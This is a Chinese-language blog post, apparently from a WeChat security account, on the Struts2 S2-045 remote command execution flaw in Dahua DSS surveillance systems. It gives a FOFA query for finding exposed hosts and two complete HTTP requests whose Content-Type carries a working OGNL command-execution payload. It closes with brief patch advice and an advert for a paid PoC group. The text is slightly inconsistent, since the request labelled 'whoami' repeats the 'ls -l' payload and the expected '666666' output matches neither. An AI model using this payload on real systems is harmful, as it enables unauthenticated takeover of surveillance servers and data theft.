#  大华DSS Digital Surveillance System系统login_init.action存在远程命令执行漏洞  
北雪网络安全
                    北雪网络安全  北雪网络安全   2026-10-18 04:58  
  
**本文章所描述的内容仅供网络安全学习使用，任何人不允许学到技术内容进行非法系统测试，作者不对任何学习文章并进行非法操作的行为负责，由本人自己承担后果，本文章仅供技术学习。**  
  
  
  
01  
  
更多内容  
  
**网络安全学习知识库每日添加最新漏洞并提供python与 nuclei 批量探测脚本：https://pc.fenchuan8.com/#/index?forum=110296**  
  
  
  
02  
  
搜索引擎  
  
fofa：app="dahua-DSS"||title="DSS"||(body="dahua"&&body="login_init.action")  
  
  
  
03  
  
漏洞原理  
  
该漏洞本质是   
Apache Struts2 S2-045（CVE-2017-5638）  
，问题出在 Struts2 的 **Jakarta Multipart 文件上传解析器**  
上：  
  
**1️⃣ 异常触发**  
：当 HTTP 请求头 Content-Type 字段包含非法内容时，Jakarta 解析器解析失败并抛出异常；  
  
**2️⃣ 关键缺陷**  
：Struts2 在异常处理流程（  
LocalizedTextUtil.findText  
）中，会  
将 Content-Type 的值直接交给 OGNL 表达式引擎解析  
，且未做任何过滤；  
  
**3️⃣ 漏洞利用**  
：OGNL 具备调用 Java 任意方法的能力，攻击者在 Content-Type 中构造恶意表达式，先通过   
[#context]()  
  
.setMemberAccess()  
 绕过 Struts2 的安全限制（SecurityMemberAccess），再调用   
ProcessBuilder  
 执行系统命令，最后将命令执行结果写入响应流回显。  
  
  
  
04  
  
影响范围  
  
<table><tbody><tr style="margin: 0px;padding: 0px;box-sizing: border-box;"><th data-colwidth="106" style="margin: 0px;padding: 10px 8px;box-sizing: border-box;background: rgb(231, 76, 60);color: rgb(255, 255, 255);font-weight: 600;"><section><span style="font-size: 14px;"><span style="font-size: 14px;"><span leaf="">项目</span></span></span></section></th><th data-colwidth="403" style="margin: 0px;padding: 10px 8px;box-sizing: border-box;background: rgb(231, 76, 60);color: rgb(255, 255, 255);font-weight: 600;"><section><span style="font-size: 14px;"><span style="font-size: 14px;"><span leaf="">详情</span></span></span></section></th></tr><tr style="margin: 0px;padding: 0px;box-sizing: border-box;background: rgb(250, 250, 250);"><td data-colwidth="106" style="margin: 0px;padding: 10px 8px;box-sizing: border-box;border-bottom: 1px solid rgb(238, 238, 238);color: rgb(192, 57, 43);font-weight: bold;white-space: nowrap;text-align: center;"><section><span style="font-size: 14px;"><span style="font-size: 14px;"><span leaf="">受影响产品</span></span></span></section></td><td data-colwidth="403" style="margin: 0px;padding: 10px 8px;box-sizing: border-box;border-bottom: 1px solid rgb(238, 238, 238);color: rgb(68, 68, 68);"><section><span style="font-size: 14px;"><span style="font-size: 14px;"><span leaf="">大华DSS 数字监控系统（Digital Surveillance System）</span></span></span></section></td></tr><tr style="margin: 0px;padding: 0px;box-sizing: border-box;"><td data-colwidth="106" style="margin: 0px;padding: 10px 8px;box-sizing: border-box;border-bottom: 1px solid rgb(238, 238, 238);color: rgb(192, 57, 43);font-weight: bold;white-space: nowrap;text-align: center;"><section><span style="font-size: 14px;"><span style="font-size: 14px;"><span leaf="">漏洞类型</span></span></span></section></td><td data-colwidth="403" style="margin: 0px;padding: 10px 8px;box-sizing: border-box;border-bottom: 1px solid rgb(238, 238, 238);color: rgb(68, 68, 68);"><section><span style="font-size: 14px;"><span style="font-size: 14px;"><span leaf="">远程命令执行（RCE / CWE-94）</span></span></span></section></td></tr><tr style="margin: 0px;padding: 0px;box-sizing: border-box;background: rgb(250, 250, 250);"><td data-colwidth="106" style="margin: 0px;padding: 10px 8px;box-sizing: border-box;border-bottom: 1px solid rgb(238, 238, 238);color: rgb(192, 57, 43);font-weight: bold;white-space: nowrap;text-align: center;"><section><span style="font-size: 14px;"><span style="font-size: 14px;"><span leaf="">漏洞编号</span></span></span></section></td><td data-colwidth="403" style="margin: 0px;padding: 10px 8px;box-sizing: border-box;border-bottom: 1px solid rgb(238, 238, 238);color: rgb(68, 68, 68);"><section><span style="font-size: 14px;"><span style="font-size: 14px;"><span leaf="">S2-045 / CVE-2017-5638</span></span></span></section></td></tr><tr style="margin: 0px;padding: 0px;box-sizing: border-box;"><td data-colwidth="106" style="margin: 0px;padding: 10px 8px;box-sizing: border-box;border-bottom: 1px solid rgb(238, 238, 238);color: rgb(192, 57, 43);font-weight: bold;white-space: nowrap;text-align: center;"><section><span style="font-size: 14px;"><span style="font-size: 14px;"><span leaf="">漏洞接口</span></span></span></section></td><td data-colwidth="403" style="margin: 0px;padding: 10px 8px;box-sizing: border-box;border-bottom: 1px solid rgb(238, 238, 238);color: rgb(68, 68, 68);"><section><span style="font-size: 14px;"><span style="font-size: 14px;"><span leaf="">/portal/login_init.action</span></span></span></section></td></tr><tr style="margin: 0px;padding: 0px;box-sizing: border-box;background: rgb(250, 250, 250);"><td data-colwidth="106" style="margin: 0px;padding: 10px 8px;box-sizing: border-box;border-bottom: 1px solid rgb(238, 238, 238);color: rgb(192, 57, 43);font-weight: bold;white-space: nowrap;text-align: center;"><section><span style="font-size: 14px;"><span style="font-size: 14px;"><span leaf="">受影响版本</span></span></span></section></td><td data-colwidth="403" style="margin: 0px;padding: 10px 8px;box-sizing: border-box;border-bottom: 1px solid rgb(238, 238, 238);color: rgb(68, 68, 68);"><section><span style="font-size: 14px;"><span style="font-size: 14px;"><span leaf="">Struts2 2.3.5 ~ 2.3.31、2.5 ~ 2.5.10 所对应的 DSS 版本</span></span></span></section></td></tr><tr style="margin: 0px;padding: 0px;box-sizing: border-box;"><td data-colwidth="106" style="margin: 0px;padding: 10px 8px;box-sizing: border-box;border-bottom: 1px solid rgb(238, 238, 238);color: rgb(192, 57, 43);font-weight: bold;white-space: nowrap;text-align: center;"><section><span style="font-size: 14px;"><span style="font-size: 14px;"><span leaf="">安全版本</span></span></span></section></td><td data-colwidth="403" style="margin: 0px;padding: 10px 8px;box-sizing: border-box;border-bottom: 1px solid rgb(238, 238, 238);color: rgb(68, 68, 68);"><section><span style="font-size: 14px;"><span style="font-size: 14px;"><span leaf="">Struts2 ≥ 2.3.32 / 2.5.10.1</span></span></span></section></td></tr><tr style="margin: 0px;padding: 0px;box-sizing: border-box;background: rgb(250, 250, 250);"><td data-colwidth="106" style="margin: 0px;padding: 10px 8px;box-sizing: border-box;border-bottom: 1px solid rgb(238, 238, 238);color: rgb(192, 57, 43);font-weight: bold;white-space: nowrap;text-align: center;"><section><span style="font-size: 14px;"><span style="font-size: 14px;"><span leaf="">是否需要认证</span></span></span></section></td><td data-colwidth="403" style="margin: 0px;padding: 10px 8px;box-sizing: border-box;border-bottom: 1px solid rgb(238, 238, 238);color: rgb(192, 57, 43);font-weight: bold;"><section><span style="font-size: 14px;"><span style="font-size: 14px;"><span leaf="">❌ 无需登录，未授权可直接利用</span></span></span></section></td></tr><tr style="margin: 0px;padding: 0px;box-sizing: border-box;"><td data-colwidth="106" style="margin: 0px;padding: 10px 8px;box-sizing: border-box;border-bottom: 1px solid rgb(238, 238, 238);color: rgb(192, 57, 43);font-weight: bold;white-space: nowrap;text-align: center;"><section><span style="font-size: 14px;"><span style="font-size: 14px;"><span leaf="">危害等级</span></span></span></section></td><td data-colwidth="403" style="margin: 0px;padding: 10px 8px;box-sizing: border-box;border-bottom: 1px solid rgb(238, 238, 238);color: rgb(192, 57, 43);font-weight: bold;"><section><span style="font-size: 14px;"><span style="font-size: 14px;"><span leaf="">🔴 严重（Critical）</span></span></span></section></td></tr></tbody></table>  
⚠️ 安防监控系统多部署于政务、园区、交通等敏感场景，且大量存量设备长期未更新，公网暴露面建议立即排查：  
  
- 该漏洞为**未授权利用**  
，无需任何账号密码；  
  
- 2017 年已公开，POC/EXP 网上大量流传，扫描器常态化打点；  
  
- 除   
login_init.action  
 外，DSS 站点下其他   
.action  
 路由同样可能受 Struts2 版本影响，需一并测试。  
  
  
  
05  
  
漏洞复现  
  
大华DSS（Digital Surveillance System）数字监控系统是由浙江大华技术股份有限公司开发的一款城市安防监控平台，主要用于视频监控、录像存储回放、报警联动、设备管理等安防管理功能，广泛应用于平安城市、智慧交通、企业园区等场景。该系统   
/portal/login_init.action  
 接口存在  
远程命令执行漏洞  
，其根源在于系统采用了 Apache Struts2 框架（S2-045，CVE-2017-5638），攻击者可以通过在HTTP请求头中构造恶意的 Content-Type 字段注入OGNL表达式，执行任意系统命令，获取服务器权限，可能导致监控数据泄露、系统被控或作为跳板进行内网横向移动。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzhwibmeY5JYWv617IibkTCxUTBmdUPzzzsvWgjqlpYIEThFR0RmQf5Ox2SBkIiaLG2nVI6uo9L9EubtnBzQ7MfU8MadBCea0dssdc/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzgGIZlSAWic6et2Bp1pdWR30hK9MnribddLViaAJC8jn37sYIZy4Wxu3YHyXyMoNauBBqAbs53WlLMVIFtiawZb7UWCLMTVmogRTmw/640?wx_fmt=png&from=appmsg "")  
  
01 验证报文（命令回显测试）  
```
POST /portal/login_init.action HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls
-l').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new
java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
Upgrade-Insecure-Requests: 1
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/d7u6ib4OKSzgTByzfvmibRYGQcdxr4JRhTofkbMXKewXpygiaQvmq7PsujL5abX8OsjI4HoDovW3TbRaIQfGm4PsquANBiclAl04GhtszezR9d4/640?wx_fmt=png&from=appmsg "")  
  
02 验证报文（whoami 测试）  
```
POST /portal/login_init.action HTTP/1.1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls
-l').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new
java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
Upgrade-Insecure-Requests: 1
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSziaFoLyeEONm4Npesh6wQKtPjEpj6S2o59iaTM2wqianBPcyWzGH3ibbgaTUGHelFzeicLnDMNiaZhHy9bYNPibEeqickAW68QNXsHN9MU/640?wx_fmt=png&from=appmsg "")  
  
响应包中返回   
666666  
 或当前用户名（如   
root  
、  
SYSTEM  
），即说明漏洞存在。  
  
06  
  
修复建议  
1. 1、关闭互联网暴露面或接口设置访问权限  
  
2、升级至安全版本（Struts2 升级至 2.3.32 / 2.5.10.1 及以上，或联系大华官方获取产品补丁）  
  
  
07  
  
内部圈子  
  
🛠️   
【知名漏洞实战圈，纯干货】  
🛠️  
  
还在找公开漏洞POC而烦恼？还在为漏洞不会验证而发愁？还在为发现不了漏洞而自卑？这里漏洞圈子解决你的困惑！  
目前已更新poc数量2500+  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/d7u6ib4OKSzjgcXA6oHpvCslxRFiaicbVlnpffOza8G4N5CxPPicMrCVyRcFgkShh8dOa09vkG8iajSt97keTvplWoCgiabY31ts4Ev30dF4fhN70/640?wx_fmt=png&from=appmsg "")  
  
  
🎯 适用场景  
  
**▫️渗透测试▫️企业漏洞自查▫️攻防演练▫️安全服务▫️合规运营******  
  
********  
**网络安全实验室**  
（https://www.wlaqsys.com/）专注漏洞情报分享、渗透实战复盘与企业安全加固：  
  
✅ 每日漏洞预警：Nday/1day 第一时间推送，附完整复现步骤  
  
✅ 实战技术分享：渗透测试、代码审计、应急响应全流程干货  
  
✅ 企业安全服务：渗透测试、等保测评、安全加固一站式解决  
  
🔺 **扫描下方二维码关注，不错过每一个高危漏洞情报。**********  
  
************  
  
  
**▫️微信扫一扫进入付费圈子查看更多漏洞内容。**  
  
**▫️全民掌握网安技能，共守智能时代晴空。**  
  
  
  
